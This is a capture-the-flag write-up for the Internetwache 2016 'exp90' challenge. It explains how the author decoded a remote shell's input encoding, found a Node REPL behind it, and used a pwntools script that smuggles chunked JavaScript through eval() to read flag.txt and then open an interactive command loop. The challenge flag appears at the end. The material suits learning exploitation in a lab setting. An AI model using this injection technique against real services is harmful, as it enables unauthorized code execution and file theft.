---
layout: post
title: Internetwache2016 exp90 Writeup
date:   2016-02-21 15:26:20 +0900
---
The challenge prompts a shell acting strangely. It encodes the user input in some way and passes it to interpreter.

So the first challenge was to figure out the rule behind it.
My first attempt was `id` which gave me `ddii` in response. It was quite clear what the encoding logic does. It kind of duplicates my input by character and reverses it. And after fiddling around with the shell I came up with this block of python code to encode my input.

{% highlight python %}
def send_cmd(conn,cmd):
    out = ''
    if len(cmd) % 2 == 1:
        cmd += ' '
    for ch in cmd:
        out += ch*(len(cmd)/2+1)
    formatted_cmd = out[::-1]
    conn.sendline(formatted_cmd)
{% endhighlight %}

However the code above didn't work for shell command of length > 10.

The next challenge was to figure out what this shell is made of. bash? doesn't seem so. After fiddling around, I typed in `this` and got some json object which looks like `InterFace { ... }`
I googled it, and it seemed like a json object that oftens shows up when priting node error message. This is where I figured out the shell running behind this was node REPL.

After that writing the exploit was pretty straight forward. I just needed to write a vaild node code which would read `flag.txt`

There is one limitation to keep in mind that the shell wouldn't accept a command with length > 10 (due to my poor guess).

But there was an easy workaround for this: as long as `eval()` was available, I could store my node script file to a variable like `a` and execute it by `eval(a)`.

Here is the python script I used to automate this flow:

{% highlight python %}
#!/usr/bin/env python

from pwn import *

def send_cmd(conn,cmd):
    out = ''
    if len(cmd) % 2 == 1:
        cmd += ' '
    for ch in cmd:
        out += ch*(len(cmd)/2+1)
    formatted_cmd = out[::-1]
    conn.sendline(formatted_cmd)

def send_node_script(conn,script):
    send_cmd(conn,"a=''")
    for i in xrange(0,len(script),5):
        ch = script[i:i+5]
        send_cmd(conn,'a+="{0}"'.format(ch))
        print conn.recvline()
    send_cmd(conn,"eval(a)")

conn = remote('188.166.133.53',12589)

print conn.recvuntil('$')
recv_length = 100

scriptfile = """
fs = require('fs');
fs.readFile('/home/exp90/flag.txt','utf8',function(err,data){
if(err){
return console.log(err);
}
d=data;
console.log(data);
})
""".replace('\n','')

send_node_script(conn,scriptfile)

while recv_length !=0 :
    cmd = raw_input()[:-1]
    print repr(cmd)
    send_cmd(conn,cmd)
    recv_buf = conn.recvuntil('$')
    recv_length = len(recv_buf)
    print recv_buf

conn.close()
{% endhighlight %}

The flag is: `IW{Shocked-for-nothing!}`
